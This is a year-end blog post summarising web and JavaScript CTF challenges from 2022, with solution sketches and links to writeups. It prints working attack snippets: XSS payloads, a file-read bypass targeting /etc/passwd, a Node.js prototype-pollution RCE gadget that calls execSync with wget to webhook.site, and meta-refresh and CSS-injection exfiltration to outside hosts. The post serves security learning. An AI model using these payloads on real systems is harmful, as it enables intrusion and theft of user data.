---
title: Summary of CTF Web Frontend and JS Challenges in 2022
catalog: true
date: 2022-12-26 20:10:44
tags: [Security]
categories: [Security]
photos: /img/ctf-2022-web-js-summary/cover-en.png
---

This year, I seriously followed Water Paddler to play CTF for a whole year. I saw someone wrote a [CTF: Best Web Challenges 2022](https://blog.arkark.dev/2022/12/17/best-web-challs/) and found that I had played most of the challenges inside. So I thought it would be better for me to write a summary, documenting the challenges that I personally felt I had learned something new from.

Because of my personal interest, the challenges that I played were related to frontend and JS. Challenges related to backend (PHP, Java, etc.) are not included.

Also, the techniques or solutions recorded in this article do not represent the first appearance in CTF. They are just the first time I saw them or thought they were worth recording, so I wrote them down.

I divided the challenges into several categories:

1. JS-related knowledge
2. Node.js related
3. XSLeaks
4. Frontend DOM/BOM related knowledge
5. Browser internal operation related

<!-- more -->

## JS-related knowledge

### DiceCTF 2022 - no-cookies

The key point of this challenge is a piece of code that looks like this:

```  js
{
  const pwd = prompt('input password')
  if (!/^[^$']+$/.test(pwd)) return
  document.querySelector('.note').innerHTML = xssPayload
}
```

The last line has a DOM-based XSS, but the pwd you want to steal is inside the block, and it seems impossible to access this part.

The key is the seemingly inconspicuous RegExp, which has a magical property called `RegExp.input`, which will remember the last thing tested. Therefore, you can use this to get the pwd.

Detailed writeup: https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#webx2fno-cookies5-solves

### PlaidCTF 2022 - YACA

The core concept of the challenge is similar to this (but I remember it was an unintended solution):

``` js
var tmpl = '<input type="submit" value="{{value}}">'
var value = prompt('your payload')
value = value.replace(/[>"]/g, '')
tmpl = tmpl.replace('{{value}}', value)
document.body.innerHTML = tmpl
```

`>"` is all replaced, and it seems impossible to escape the attribute. But the key is that the parameter of tmpl replace can be controlled. At this time, you can use [special replacement pattern](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement) to get the tag:

``` js
var tmpl = '<input type="submit" value="{{value}}">'
var value = "$'<style onload=alert(1) "
value = value.replace(/[>"]/g, '')
tmpl = tmpl.replace('{{value}}', value)
console.log(tmpl)
// <input type="submit" value=""><style onload=alert(1) ">
```

Full writeup: https://blog.huli.tw/2022/04/14/en/javascript-string-regexp-magic/

### ångstromCTF 2022 - CaaSio PSE

In short, use `with()` to bypass the restriction that `.` cannot be used.

Complete writeup: https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup/#miscx2fcaasio-pse

### GoogleCTF 2022 - HORKOS

I call this challenge "JS deserialization". In short, there are also some magic methods in JS that will be executed automatically.

For example, when you return something in an async function, if this thing is a Promise, it will be resolved before returning, so `then` will be called automatically.

Similarly, some implicit type conversions will also call `toString` or `valueOf`, and `toJSON` will be called when converted to JSON.

Complete writeup: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/

### corCTF 2022 - sbxcalc

``` js
var p = new Proxy({flag: window.flag || 'flag'}, {
  get: () => 'nope'
})
```

How to get the original object protected by Proxy?

The answer is `Object.getOwnPropertyDescriptor(p, 'flag')`

Writeup: https://blog.huli.tw/2022/12/08/en/ctf-js-notes/#corctf-2022-sbxcalc

## Node.js related

### DiceCTF 2022 - undefined

The core of this problem is as follows:

``` js
Function.prototype.constructor = undefined;
delete global.global;
process = undefined;
{
  let Array=undefined;let __dirname=undefined;let Int8Array=undefined;
  // ... a lot of similar statements to make things undefined
  
  console.log(eval(input));
}
```

Basically, everything is turned into `undefined` first, and then the code you pass in will be executed using `eval`. Although you can run anything, because everything has become `undefined`, there is not much you can do.

There are three solutions:

1. `import()`, which has not been deleted.
2. Using `arguments.callee.caller.arguments` can get the overwritten arguments of the upper layer (a layer automatically wrapped by Node.js).
3. Using try-catch can get the instance of Error.

Detailed writeup: https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#miscx2fundefined55-solves

### corCTF 2022 - simplewaf

The core of this problem is as follows:

``` js
if([req.body, req.headers, req.query].some(
    (item) => item && JSON.stringify(item).includes("flag")
)) {
    return res.send("bad hacker!");
}
res.send(fs.readFileSync(req.query.file || "index.html").toString());
```

You can control `req.query.file`, but it cannot contain the word `flag`. The goal is to read the file `/app/flag.txt`.

You need to look at the internal implementation of `fs.readFileSync` and find that you can pass an object that looks like a URL instance, and it will use `new URL()` to read it, so you can bypass it with URL encoding:

``` js
const fs = require('fs')

console.log(fs.readFileSync({
  href: 1,
  origin: 1,
  protocol: 'file:',
  hostname: '',
  pathname: '/etc/passw%64'
}).toString())
// equals to readFileSync(new URL("file:///etc/passw%64"))
```

Author's writeup: https://brycec.me/posts/corctf_2022_challenges#simplewaf

### Balsn CTF 2022 - 2linenodejs

The core of the code looks like this:

``` js
#!/usr/local/bin/node
process.stdin.setEncoding('utf-8');
process.stdin.on('readable', () => {
  try{
    console.log('HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n');
    const json = process.stdin.read().match(/\?(.*?)\ /)?.[1],
    obj = JSON.parse(json);
    console.log(`JSON: ${json}, Object:`, require('./index')(obj, {}));
  }catch (e) {
    require('./usage')
  }finally{
    process.exit();
  }
});

// index
module.exports=(O,o) => (
    Object.entries(O).forEach(
        ([K,V])=>Object.entries(V).forEach(
            ([k,v])=>(o[K]=o[K]||{},o[K][k]=v)
        )
    ), o
);
```

There is an obvious prototype pollution, and RCE needs to be achieved.

Here is a great paper for reference: [Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js](https://arxiv.org/abs/2207.11171)

But the gadget mentioned in the paper has been fixed, so you need to find another one yourself, and the result is as follows:

``` js
Object.prototype["data"] = {
  exports: {
    ".": "./preinstall.js"
  },
  name: './usage'
}
Object.prototype["path"] = '/opt/yarn-v1.22.19'
Object.prototype.shell = "node"
Object.prototype["npm_config_global"] = 1
Object.prototype.env = {
  "NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site?q=2').toString());process.exit()//",
  "NODE_OPTIONS": "--require=/proc/self/environ"
}

require('./usage.js')
```

Details can be found in the complete writeup: https://blog.huli.tw/2022/12/08/en/ctf-js-notes/#balsn-ctf-2022-2linenodejs

## XSleaks

### DiceCTF 2022 - carrot

In short, this problem uses [connection pool](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/) to measure response time.

You may think that measuring response time is not difficult. Just use fetch and calculate it yourself, right? But if there is a SameSite cookie, fetch cannot be used, and some XSleaks tricks are needed to measure time.

In Chrome, the number of sockets is limited, generally 255, and headless is 99. Assuming we first consume the socket to only one left, at this time, we visit the URL we want to measure the time (called reqSearch), and at the same time, send another request to our own server (called reqMeasure).

Since there is only one socket left, the time from reqMeasure sending the request to receiving the response is `the time reqSearch takes + the time reqMeasure takes`. If the time reqMeasure takes is about the same, then we can easily measure the time reqSearch takes.

Detailed writeup: https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#webx2fcarrot1-solves

### TSJ CTF 2022 - Nim Notes

In this problem, you can achieve CRLF injection, but the position is at the bottom, so you cannot override CSP and XSS. How to steal the content of the page?

Assuming that the content to be stolen is in `<script>`, you can use the header [Content-Security-Policy-Report-Only](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only), because when it violates the rules, it will send a JSON to the specified location, which will include the first 40 characters of the script.

Complete writeup: https://blog.huli.tw/2022/03/02/en/tsj-ctf-2022-nim-notes/

### ångstromCTF 2022 - Sustenance

There is a search function, and the difference between success and failure lies in the URL.

For example, success is: `/?m=your search...at 1651732982748 has success....`, and failure is: `/?m=your search...at 1651732982748 has failed`

There are two solutions. One is to use fetch to measure whether it is in the cache, as the response will be cached. Although Chrome has implemented Cache partition, headless has not yet.

The second is to use cookie tossing with other same site domains to construct a cookie bomb. When the search is successful, the payload will be too large (because there are a few more characters in the URL), and there will be no problem when it fails, thus measuring the difference.

Complete writeup: https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup/#webx2fsustenance

### justCTF 2022 - Ninja

A new xsleak that uses `:target` with `:before` to load images.

For details, please refer to: [New technique of stealing data using CSS and Scroll-to-Text Fragment feature.](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

Complete writeup: https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves

### SekaiCTF 2022 - safelist

Use lazy-loading images to send requests to the server to slow down the server speed, and use timing attacks to determine whether the image is loaded.

You can also use the connection pool or other elements mentioned earlier to solve it.

Writeup: https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/

## Front-end DOM/BOM related knowledge

### DiceCTF 2022 - shadow

The core of this problem is how to get things in the shadowDOM. For a more complete study, see: [The Closed Shadow DOM](https://blog.ankursundara.com/shadow-dom/)

But the final solution is:

1. Set the CSS `-webkit-user-modify` property, which is similar to `contenteditable`
2. Use `window.find` to find the content
3. Use `document.execCommand` to insert HTML and use svg to get the node

Detailed writeup: https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#webx2fshadow0-solves

### LINE CTF 2022 - Haribote Secure Note

There are two injection points in this problem. The first is in the script, which can control 16 characters, and the second is HTML injection. The biggest problem is that the CSP is very strict:

``` html
<meta content="default-src 'self'; style-src 'unsafe-inline'; object-src 'none'; base-uri 'none'; script-src 'nonce-{{ csp_nonce }}'
    'unsafe-inline'; require-trusted-types-for 'script'; trusted-types default"
          http-equiv="Content-Security-Policy">
```

There are three solutions:

1. The magical [script data double escaped state](https://www.w3.org/TR/2011/WD-html5-20110405/tokenization.html#script-data-double-escaped-state)
2. `import()` will not be blocked by Trusted Types
3. Use `<iframe src='/p'>` to execute code on other pages to bypass CSP

Here is a great article: [Eliminating XSS from WebUI with Trusted Types](https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types)

Complete writeup: https://blog.huli.tw/2022/03/27/en/linectf-2022-writeup/#haribote-secure-note7-solves

### m0leCon CTF 2022 - ptMD

Leak URL using `meta` combination:

``` html
<meta name="referrer" content="unsafe-url" />
<meta http-equiv="refresh" content="3;url=https://webhook.site/d485f13a-fd8b-4cfd-ad13-63d9b0f1f5ef" />
```

In a strict CSP state, meta can be used as a breakthrough technique. These meta tags, like the ones above, work even if they are not placed inside the head tag, and even after they are removed.

Full writeup: https://blog.huli.tw/2022/05/21/en/m0lecon-ctf-2022-writeup/

### corCTF 2022 - modernblog

This is a React app that uses `dangerouslySetInnerHTML` to render your content, which means you get an HTML injection.

But CSP doesn't allow you to execute scripts: `script-src 'self'; object-src 'none'; base-uri 'none';`

What you need to steal is the URL with the flag ID, which appears on the `/home` page. If we can do CSS injection on that page, we can steal it like this:

``` css
a[href^="/post/0"] {
  background: url(//myserver?c=0);
}

a[href^="/post/1"] {
  background: url(//myserver?c=1);
}

// ...
```

And since we are currently on the `/posts/:id` page, we cannot get the content of the `/home` page, so we cannot do this.

The key point of this question is a very interesting usage of DOM clobbering. Nowadays, React apps basically use [react-router](https://reactrouter.com/en/main) to do routing. This lib will use `document.defaultView.history` to see what the URL is and decide which page to render.

And `document.defaultView` can be affected by DOM clobbering, like this:

``` html
<iframe name=defaultView src=/home></iframe>
```

In this way, `document.defaultView.history` becomes `/home`, so we can render another React app inside the React app using iframe srcdoc, and use the CSS injection mentioned earlier to get the flag ID:

``` html
<iframe srcdoc="
  <iframe name=defaultView src=/home></iframe><br>
  <style>
    a[href^="/post/0"] {
      background: url(//myserver?c=0);
    }

    a[href^="/post/1"] {
      background: url(//myserver?c=1);
    }
  
  </style>

  react app below<br>
  <div id=root></div>
  <script type=module crossorigin src=/assets/index.7352e15a.js></script>
" height="1000px" width="500px"></iframe>
```

My previous English writeup: https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/

### HITCON CTF 2022 - Self Destruct Message

Originally, when using `element.innerHTML = str`, it was asynchronous, but using the magical `<svg><svg>` can make it synchronous:

``` html
const div = document.createElement('div')
div.innerHTML = '<svg><svg onload=console.log(1)>'
console.log(2)
```

It will output 1 first and then 2, and it will take effect without inserting it into the DOM.

Related discussion: https://twitter.com/terjanq/status/1421093136022048775

Writeup: https://blog.huli.tw/2022/12/08/en/ctf-js-notes/#hitcon-ctf-2022

### SekaiCTF 2022 - Obligatory Calc

Two key points:

1. `e.source` in onmessage is the source window that sends the message. Although it looks like an object at first glance, if it is closed immediately after postMessage, it will become null.
2. Accessing `document.cookie` under a sandbox iframe will result in an error.

## Browser internals related

### GoogleCTF 2022 - POSTVIEWER

This question is related to the order in which the browser executes things, as well as site isolation and other things. Through these things, you can construct an iframe-related race condition.

Full writeup: https://blog.huli.tw/2022/07/09/en/google-ctf-2022-writeup/#postviewer-10-solves

### UIUCTF 2022 - modernism

The code is very simple:

``` py
from flask import Flask, Response, request
app = Flask(__name__)

@app.route('/')
def index():
    prefix = bytes.fromhex(request.args.get("p", default="", type=str))
    flag = request.cookies.get("FLAG", default="uiuctf{FAKEFLAG}").encode() #^uiuctf{[A-Za-z]+}$
    return Response(prefix+flag, mimetype="text/plain")
```

After adding the flag you provided and outputting it, although the MIME type is `text/plain`, because `X-Content-Type-Options: nosniff` is not added, `<script>` can still be used to load this part.

However, because the flag contains `{}`, it cannot be easily made into an executable script (syntax error will keep appearing).

The solution is to add a BOM at the beginning, and the browser will read the entire script in UTF-16, and the flag will become strange Chinese characters and will not be broken. The content to be placed is `++window.`, and then you can see which property of the window has been changed.

The solution to this problem basically requires knowledge of how the browser reads.

Full writeup: https://blog.huli.tw/2022/08/01/en/uiuctf-2022-writeup/

### UIUCTF 2022 - precisionism

An extension of the previous challenge, only adding `Enjoy your flag!` at the end, so the trick mentioned above cannot be used.

The expected solution is to make the response into ICO format, put the part to be leaked into the width, and it is possible to get the width of the image cross-originally, so you can leak the data byte by byte.

Full writeup: https://blog.huli.tw/2022/08/01/en/uiuctf-2022-writeup/#precisionism3-solves

### SECCON CTF 2022 Quals - spanote

This question uses bfcache: https://web.dev/i18n/en/bfcache/

Suppose there is an API that looks like this:

``` js
fastify.get("/api/notes/:noteId", async (request, reply) => {
  const user = new User(request.session.userId);
  if (request.headers["x-token"] !== hash(user.id)) {
    throw new Error("Invalid token");
  }
  const noteId = validate(request.params.noteId);
  return user.sendNote(reply, noteId);
});
```

Although it is a GET, it will check the custom header, so theoretically it cannot be viewed by accessing it directly with a browser.

But using bfcache, it can be solved like this:

1. Open `/api/notes/id` in a new window, and an error screen will appear
2. Go to the homepage with the same tab. At this time, the homepage will use fetch to fetch `/api/notes/id` with a custom header, and the browser will store the result in the disk cache
3. Go back one page, and the screen will display the cached result

You can directly browse the cached response in the browser, bypassing the custom header restriction.

Full writeup: https://blog.huli.tw/2022/12/08/en/ctf-js-notes/#seccon-ctf-2022-quals-spanote

## Bonus: Authors of Great Web Challenges

It takes a lot of time and effort to make a good CTF challenge, so I thought I would wrote a bit about these authors since I have already wrote about the challenges.

The first is [Ankur Sundara](https://twitter.com/ankursundara), a member of the dicegang team. He created the UIUCTF questions mentioned above, and he also created a question related to content type before. I feel that he must have read the Chromium source code related parts before producing those questions.

In addition, he also wrote this research on Shadow DOM: [The Closed Shadow DOM](https://blog.ankursundara.com/shadow-dom/)

The second is [terjanq](https://twitter.com/terjanq), who works at Google. He created the GoogleCTF race condition question mentioned above, and he has also created a lot of classic questions before. He maintains the XSleak wiki, and I always feel that there is nothing he doesn't know about behavior related to browsers...

He occasionally plays CTF with the justCatTheFish team, and if there are only one or two teams that solve some frontend Web questions, there is a high probability that justCatTheFish is one of them.

The third is [strellic](https://twitter.com/Strellic_), also from dicegang. He has created a lot of questions and the quality is very good. The writeups are also very detailed. I learned a lot of skills and new ideas from him. He always combines old or known technique and develops a new one.

Of course, there are other impressive people, but I'm too lazy to introduce them one by one XD

For example, the author of the article mentioned at the beginning [@arkark_](https://twitter.com/arkark_), [@zwad3](https://twitter.com/zwad3), who created a challenge that still amazes me, frequent solver [@parrot409](https://twitter.com/parrot409), and [@maple3142](https://twitter.com/maple3142), who are all very active in CTF.

## Summary

After writing, I found that I have attempted many challenges (although I couldn't solve many of them), and some of the challenges, although the concepts are not difficult, are quite troublesome to implement.

In addition, it can be seen that many challenges require looking at the source code of the lib to solve. Personally, I like this kind of question, which gives a real-world feeling. It's something you use every day, but you don't know how it works behind the scenes. CTF forces you to understand it. Although it has nothing to do with the web, there were also two or three challenges related to Git this year, which required understanding how Git works to solve.

I learned a lot of techniques that I had no idea about before this year. I feel that my understanding of JS and browsers has improved a bit, but I can foresee that I will still be challenged next year, and there will be more things that I don't know.

Finally, I would like to thank each challenge author. It is because of these challenge authors who share their research through challenges that others can learn these novel techniques. I personally think that it is harder to make a good challenge than to solve it. If you are solving a challenge, you know that there is an solution somewhere, and you just need to find it. To make a good challenge, you need to discover something new by yourself, which is really difficult. Once again, kudos to every challenge maker.
